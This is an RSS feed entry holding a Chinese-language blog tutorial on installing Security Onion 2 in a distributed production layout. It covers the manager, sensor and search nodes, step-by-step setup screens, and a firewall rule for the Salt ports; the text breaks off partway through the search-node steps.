<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SecDevOps on KeePwn's Notes</title><link>https://www.keepwn.com/categories/secdevops/</link><description>Recent content in SecDevOps on KeePwn's Notes</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 17 Oct 2024 15:21:10 +0000</lastBuildDate><atom:link href="https://www.keepwn.com/categories/secdevops/index.xml" rel="self" type="application/rss+xml"/><item><title>Security-Onion-2分布式实践之安装篇</title><link>https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/</link><pubDate>Sat, 20 Mar 2021 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/</guid><description>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/banner-security-onion-2-distributed-practice-install.png" alt="Featured image of post Security-Onion-2分布式实践之安装篇" />&lt;h2 id="前言">前言
&lt;/h2>&lt;blockquote>
&lt;p>Security Onion （以下称安全洋葱）是一款免费且开源的，用于威胁发现、企业安全监视和日志管理的 Linux 发行版本。
目前，安全洋葱已经迭代至 2.X，与 1.X 版本不同，2.X 版本基于容器开发，实现了将各个组件和服务容器化，更易于使用者部署和定制。&lt;/p>
&lt;/blockquote>
&lt;p>安全洋葱的安装较为简单，网络上也有诸多的 ALL IN ONE 的安装教程，但考虑到这些部署方式不太适合生产环境使用，所以本篇主要讲述如何在生产环境分布式部署安全洋葱系统。本篇并不涉及系统的调优，如果你此前已经安装并部署了安全洋葱，可以跳过此章节。&lt;/p>
&lt;p>&lt;strong>本文中使用的安全洋葱版本为 v2.3.30（截至本文编写时）。&lt;/strong>&lt;/p>
&lt;h2 id="准备工作">准备工作
&lt;/h2>&lt;p>官方文档建议采用&lt;code>标准的分布式部署方式&lt;/code>进行部署安全洋葱，至少以下三个节点：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>节点类型&lt;/th>
&lt;th>说明&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>manager node&lt;/td>
&lt;td>主要节点，负责接收采集到的原始数据&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>forward node&lt;/td>
&lt;td>流量分析节点，也叫 sensor-node&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>search-node&lt;/td>
&lt;td>搜索节点，存储 ES 数据&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>我部署了 4 个节点，大家根据实际情况进行扩展：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>节点&lt;/th>
&lt;th>IP&lt;/th>
&lt;th>配置&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>security-manager&lt;/td>
&lt;td>10.10.0.1&lt;/td>
&lt;td>8 cores, 16g memory, 200g disk&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>security-sensor&lt;/td>
&lt;td>10.10.0.100&lt;/td>
&lt;td>8 cores, 32g memory, 12t disk&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>security-search-1&lt;/td>
&lt;td>10.10.0.11&lt;/td>
&lt;td>8 cores, 16g memory, 2t disk&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>security-search-2&lt;/td>
&lt;td>10.10.0.12&lt;/td>
&lt;td>8 cores, 16g memory, 2t disk&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>架构大致如下：&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-distributed.webp"
width="1044"
height="1614"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-distributed_hu6576850059616948034.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-distributed_hu1976766234695311345.webp 1024w"
loading="lazy"
alt="so-distributed.webp"
class="gallery-image"
data-flex-grow="64"
data-flex-basis="155px"
>&lt;/p>
&lt;h2 id="开始安装">开始安装
&lt;/h2>&lt;h3 id="security-manager">Security-manager
&lt;/h3>&lt;p>1.从 ISO 引导启动，设置完用户名和密码，回车后开始安装系统，安装完成后重启系统。&lt;/p>
&lt;p>2.登录系统，输入用户名和密码，准备开始配置。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-1.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-1_hu14390587108983593455.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-1_hu10893297322997206075.webp 1024w"
loading="lazy"
alt="so-manager-setup-1.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>3.选择安装类型为distributed&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-2-choose-install-type.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-2-choose-install-type_hu5306828141386879391.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-2-choose-install-type_hu494661194507058856.webp 1024w"
loading="lazy"
alt="so-manager-setup-2-choose-install-type.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>4.选择节点类型为manager&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-3-choose-node-type.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-3-choose-node-type_hu11932093124275125251.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-3-choose-node-type_hu13732377266401926852.webp 1024w"
loading="lazy"
alt="so-manager-setup-3-choose-node-type.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>5.选择安装环境为standard，这里需要注意 security-manager 这台主机需要能够联网。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-4-choose-install-condition.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-4-choose-install-condition_hu13854446965272622170.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-4-choose-install-condition_hu8732304625510056493.webp 1024w"
loading="lazy"
alt="so-manager-setup-4-choose-install-condition.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>6.设置主机名&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-5-set-hostname.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-5-set-hostname_hu10619629711317195912.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-5-set-hostname_hu11079445151185480539.webp 1024w"
loading="lazy"
alt="so-manager-setup-5-set-hostname.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>7.设置管理口，并配置静态地址（这里建议不要选择DHCP分配地址，会影响服务/节点之间的通信）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-6-choose-nic.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-6-choose-nic_hu5562690374904795597.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-6-choose-nic_hu12882782101439332945.webp 1024w"
loading="lazy"
alt="so-manager-setup-6-choose-nic.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-7-set-static-address.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-7-set-static-address_hu18428156856379322519.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-7-set-static-address_hu12772274479705204741.webp 1024w"
loading="lazy"
alt="so-manager-setup-7-set-static-address.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>8.选择系统补丁计划（默认），设置家庭网络（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-8-choose-os-path-schedule.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-8-choose-os-path-schedule_hu17141714027607038363.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-8-choose-os-path-schedule_hu9283583471694514167.webp 1024w"
loading="lazy"
alt="so-manager-setup-8-choose-os-path-schedule.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-9-set-home-network.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-9-set-home-network_hu8903470710821548176.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-9-set-home-network_hu950587991707018994.webp 1024w"
loading="lazy"
alt="so-manager-setup-9-set-home-network.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>9.选择安装类型为高级，进行功能定制化&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-10-choose-manager-type.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-10-choose-manager-type_hu16262970616476553352.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-10-choose-manager-type_hu10169883057716419583.webp 1024w"
loading="lazy"
alt="so-manager-setup-10-choose-manager-type.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>10.设置 ES 集群名称（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-11-set-es-cluser-name.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-11-set-es-cluser-name_hu8906854852214240196.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-11-set-es-cluser-name_hu17219985813756852092.webp 1024w"
loading="lazy"
alt="so-manager-setup-11-set-es-cluser-name.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>11.选择元信息分析引擎（zeek or suricata）。考虑到 zeek 可定制化更强些，所以我选择的是 zeek 处理 metadata，suricata 处理 nids-alerts。事实上，两种方式均可，官方这里有讨论//TODO。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-12-choose-gen-metadata.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-12-choose-gen-metadata_hu7497062085016350199.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-12-choose-gen-metadata_hu14354028374957021702.webp 1024w"
loading="lazy"
alt="so-manager-setup-12-choose-gen-metadata.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>12.选择需要发送的日志类型。&lt;/p>
&lt;blockquote>
&lt;p>请注意，这指的是需要被发送到 manager 节点的日志类型，不是 zeek 要处理的协议（这需要额外进行配置）&lt;/p>
&lt;/blockquote>
&lt;p>建议按照实际监测需求和节点存储容量进行权衡。有选择恐惧症的可以先按默认的来，后面可以再修改的:)。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-13-choose-logs-to-send.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-13-choose-logs-to-send_hu2164056832258113590.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-13-choose-logs-to-send_hu15171834537596022030.webp 1024w"
loading="lazy"
alt="so-manager-setup-13-choose-logs-to-send.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>13.选择 IDS 规则集（默认）。你也可以选择高级订阅版。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-14-choose-ids-ruleset.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-14-choose-ids-ruleset_hu750362993418592353.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-14-choose-ids-ruleset_hu7583102186244898169.webp 1024w"
loading="lazy"
alt="so-manager-setup-14-choose-ids-ruleset.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>14.选择安装的组件列表（默认）。按需选择。&lt;/p>
&lt;ul>
&lt;li>Grafana
&lt;ul>
&lt;li>主机的健康监控和报警&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Fleet &amp;amp; osquery
&lt;ul>
&lt;li>HIDS，侧重于主机信息被动/主动采集&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Wazuh
&lt;ul>
&lt;li>HIDS，侧重于威胁检测、完整性监控等&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>TheHive
&lt;ul>
&lt;li>安全事件响应平台&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Playbook
&lt;ul>
&lt;li>检测 Playbook 的工具&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Strelka
&lt;ul>
&lt;li>文件提取/分析，用于威胁搜索、威胁检测和事件响应&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-15-choose-components.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-15-choose-components_hu2866248112239674496.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-15-choose-components_hu5244775254003503429.webp 1024w"
loading="lazy"
alt="so-manager-setup-15-choose-components.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>15.为其他组件设置邮箱和密码&lt;/p>
&lt;p>16.选择 WEB 界面的访问方式。我选择的是IP，也可以改为域名方式。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-16-choose-web-access.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-16-choose-web-access_hu17054406131082301163.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-16-choose-web-access_hu15563034051305105785.webp 1024w"
loading="lazy"
alt="so-manager-setup-16-choose-web-access.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>17.选择下载系统更新包的方式。建议选择&lt;code>通过 manager 节点下载&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-17-choose-update-os-by-manager-proxy.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-17-choose-update-os-by-manager-proxy_hu12062204521983833352.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-17-choose-update-os-by-manager-proxy_hu1710905679948521840.webp 1024w"
loading="lazy"
alt="so-manager-setup-17-choose-update-os-by-manager-proxy.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>18.设置 soremote 密码，后面用于添加其他节点。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-18-set-soremote-passwd.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-18-set-soremote-passwd_hu5896052475393659182.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-18-set-soremote-passwd_hu12412953461297222914.webp 1024w"
loading="lazy"
alt="so-manager-setup-18-set-soremote-passwd.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>19.设置允许访问WEB界面的网段。建议只添加安全运维段的主机IP, 不在该网段的主机将无法访问WEB界面。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-19-set-so-allow.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-19-set-so-allow_hu12504633548029521822.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-19-set-so-allow_hu18439034408115858639.webp 1024w"
loading="lazy"
alt="so-manager-setup-19-set-so-allow.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>20.确定应用配置，等待完成安装。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-20.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-20_hu15397744509127007432.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-20_hu2980776156373421314.webp 1024w"
loading="lazy"
alt="so-manager-setup-20.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-21.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-21_hu1046067143667869191.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-manager-setup-21_hu14867628767178817620.webp 1024w"
loading="lazy"
alt="so-manager-setup-21.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>21.配置防火墙规则，允许其他节点访问管理节点的 Salt 服务 （&lt;strong>重要&lt;/strong>）&lt;/p>
&lt;blockquote>
&lt;p>很多人在部署非管理节点的时候总是提示安装失败，就是因为缺少这个步骤导致的。
sosetup.log中的报错日志类似：&lt;code>[ERROR ] 'mine.send': False&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">firewall-cmd --permanent --zone&lt;span class="o">=&lt;/span> --add-port&lt;span class="o">=&lt;/span>4505-4506/tcp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">firewall-cmd --reload
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="security-sensor">Security-sensor
&lt;/h3>&lt;p>1.完成基础的系统安装后，我们开始配置流量分析节点。&lt;/p>
&lt;p>2.选择安装类型为 distributed&lt;/p>
&lt;p>3.选择节点类型为 sensor&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-1-choose-install-type.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-1-choose-install-type_hu18168220290289458325.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-1-choose-install-type_hu15875981526559449929.webp 1024w"
loading="lazy"
alt="so-sensor-setup-1-choose-install-type.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>4.设置主机名&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-2-set-hostname.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-2-set-hostname_hu1507295894250270765.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-2-set-hostname_hu1089994697468210461.webp 1024w"
loading="lazy"
alt="so-sensor-setup-2-set-hostname.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>5.选择管理口，并配置静态地址&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-3-choose-nic.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-3-choose-nic_hu12638414849526083888.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-3-choose-nic_hu538267273903326911.webp 1024w"
loading="lazy"
alt="so-sensor-setup-3-choose-nic.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>6.设置 manager 节点，并输入 soremote 密码，与 manager 节点完成连接。&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-4-set-manager-hostname.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-4-set-manager-hostname_hu9343147533713538933.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-4-set-manager-hostname_hu821597276624350016.webp 1024w"
loading="lazy"
alt="so-sensor-setup-4-set-manager-hostname.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-5-set-manager-ip.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-5-set-manager-ip_hu1884367973293701652.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-5-set-manager-ip_hu9477655240291512126.webp 1024w"
loading="lazy"
alt="so-sensor-setup-5-set-manager-ip.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-6-connect-to-manager.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-6-connect-to-manager_hu11422398264986189644.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-6-connect-to-manager_hu8749012711788746818.webp 1024w"
loading="lazy"
alt="so-sensor-setup-6-connect-to-manager.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>7.选择镜像口&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-7-choose-monitor-nic.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-7-choose-monitor-nic_hu17071652250183493507.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-7-choose-monitor-nic_hu16804477849100612706.webp 1024w"
loading="lazy"
alt="so-sensor-setup-7-choose-monitor-nic.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-8.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-8_hu9966625120922519769.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-8_hu16336528140618531469.webp 1024w"
loading="lazy"
alt="so-sensor-setup-8.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>8.选择系统补丁计划（默认），选择下载系统更新包的方式为 manager。&lt;/p>
&lt;p>9.选择安装类型为高级，进行功能定制化。&lt;/p>
&lt;p>10.进行 CPU 绑定（Zeek、Suricata）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-9-bind-cpu-zeek.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-9-bind-cpu-zeek_hu12476611116973468030.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-9-bind-cpu-zeek_hu5425572847279270129.webp 1024w"
loading="lazy"
alt="so-sensor-setup-9-bind-cpu-zeek.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-10-bind-cpu-surucata.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-10-bind-cpu-surucata_hu5325855206791545811.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-10-bind-cpu-surucata_hu5538192477276228354.webp 1024w"
loading="lazy"
alt="so-sensor-setup-10-bind-cpu-surucata.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>11.配置镜像口MTU（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-11-mtu.webp"
width="1664"
height="1080"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-11-mtu_hu12099124786816853803.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-sensor-setup-11-mtu_hu2866188916507268794.webp 1024w"
loading="lazy"
alt="so-sensor-setup-11-mtu.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>12.等待安装完成。&lt;/p>
&lt;h3 id="security-search">Security-search
&lt;/h3>&lt;p>1.完成基础的系统安装后，我们开始配置流量分析节点。&lt;/p>
&lt;p>2.选择安装类型为 distributed&lt;/p>
&lt;p>3.选择节点类型为 searchnode&lt;/p>
&lt;p>4.设置主机名&lt;/p>
&lt;p>5.选择管理口，并配置静态地址&lt;/p>
&lt;p>6.设置 manager 节点（输入 soremote 密码）&lt;/p>
&lt;p>7.选择系统补丁计划（默认），选择下载系统更新包的方式为 manager。&lt;/p>
&lt;p>8.选择安装类型为高级，进行功能定制化。&lt;/p>
&lt;p>9.配置 ES 堆大小（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-1-set-es-heap-size.webp"
width="832"
height="540"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-1-set-es-heap-size_hu4664832709182791843.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-1-set-es-heap-size_hu13536475056572640768.webp 1024w"
loading="lazy"
alt="so-search-setup-1-set-es-heap-size.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>10.配置 Logstash 堆大小（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-2-set-logstash-heap-size.webp"
width="832"
height="540"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-2-set-logstash-heap-size_hu9401208031723271236.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-2-set-logstash-heap-size_hu2329884309031287431.webp 1024w"
loading="lazy"
alt="so-search-setup-2-set-logstash-heap-size.webp"
class="gallery-image"
data-flex-grow="154"
data-flex-basis="369px"
>&lt;/p>
&lt;p>11.配置 Logstash pipeline 线程（默认）&lt;/p>
&lt;p>&lt;img src="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-3-set-logstash-pipeline-workers.webp"
width="832"
height="540"
srcset="https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-3-set-logstash-pipeline-workers_hu13919850926671085264.webp 480w, https://www.keepwn.com/posts/security-onion-2-distributed-practice-install/images/so-search-setup-3-set-logstash-pipeline-workers_hu1583944832350249762.webp 1024w"
loading="lazy"
alt="so-search-setup-3-set-logstash-pipeline-workers.webp"
class="gallery-image"
data-flex-grow="154"
